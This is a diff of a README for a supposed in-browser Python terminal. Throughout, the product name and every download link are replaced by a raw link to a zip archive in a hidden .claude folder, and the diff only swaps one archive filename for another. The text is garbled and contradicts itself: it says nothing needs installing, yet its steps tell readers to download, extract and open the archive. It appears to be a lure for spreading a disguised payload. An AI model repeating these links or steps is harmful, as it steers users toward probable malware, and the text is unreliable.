@@ -1,16 +1,16 @@
 # 🐍 yuv-python-terminal - Run Python Code Right in Your Browser
 
 ## 🎉 Overview
-https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal lets you execute Python code directly in your browser using WebAssembly. Whether you're a student, teacher, or just curious about Python, this tool makes learning code fun and interactive. With a simple and engaging interface, you can write and test Python code without needing any installation.
+https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal lets you execute Python code directly in your browser using WebAssembly. Whether you're a student, teacher, or just curious about Python, this tool makes learning code fun and interactive. With a simple and engaging interface, you can write and test Python code without needing any installation.
 
 ## 📥 Download the Application
-[![Download https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip%20Terminal-brightgreen)](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip)
+[![Download https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip%20Terminal-brightgreen)](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip)
 
 ## 🚀 Getting Started
-Follow these steps to get the https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal up and running:
+Follow these steps to get the https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal up and running:
 
 1. **Visit the Releases Page**  
-   To download the latest version, go to our [Releases page](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip).
+   To download the latest version, go to our [Releases page](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the most recent release and click on it.
@@ -25,10 +25,10 @@ Follow these steps to get the https://github.com/eliud-09/yuv-python-terminal/ra
    After you have downloaded and extracted the files, open your favorite web browser such as Chrome, Firefox, or Edge.
 
 6. **Run the Application**  
-   Open the https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip file from the extracted folder. This will launch the https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal in your browser. Start coding right away!
+   Open the https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip file from the extracted folder. This will launch the https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal in your browser. Start coding right away!
 
 ## 📋 System Requirements
-https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal works on any modern web browser. Ensure your browser is up to date for the best experience. There are no special system requirements needed; just an internet connection to download the app, and you're good to go.
+https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal works on any modern web browser. Ensure your browser is up to date for the best experience. There are no special system requirements needed; just an internet connection to download the app, and you're good to go.
 
 ## 🎨 Features
 - **Interactive Coding Environment**: Write and test Python code directly in your browser.
@@ -37,14 +37,14 @@ https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yu
 - **Instant Feedback**: Run your code and see the results in real-time.
 
 ## 🧑‍🏫 Educational Use Cases
-https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal is not just a coding tool; it's an educational resource. Here are a few ways you can use it:
+https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal is not just a coding tool; it's an educational resource. Here are a few ways you can use it:
 
 - **Learning Python Basics**: Ideal for students starting their coding journey.
 - **Teaching**: Educators can use it for demonstrations in classrooms.
 - **Experimentation**: Curious learners can test snippets of code instantly.
 
 ## 🌐 Support and Community
-If you need help using https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal or have any questions, feel free to open issues on our GitHub repository. Your feedback can help us improve this tool for everyone.
+If you need help using https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal or have any questions, feel free to open issues on our GitHub repository. Your feedback can help us improve this tool for everyone.
 
 ## 💡 Tips
 - Experiment with different Python libraries and code examples available online.
@@ -52,4 +52,4 @@ If you need help using https://github.com/eliud-09/yuv-python-terminal/raw/refs/
 - Share your experiences and projects with friends and the learning community.
 
 ## 📥 Download Again
-To download the latest version of https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip Terminal, visit our [Releases page](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/yuv_python_terminal_2.4.zip). Enjoy your journey in coding!
+To download the latest version of https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip Terminal, visit our [Releases page](https://github.com/eliud-09/yuv-python-terminal/raw/refs/heads/master/.claude/terminal_python_yuv_v1.6.zip). Enjoy your journey in coding!
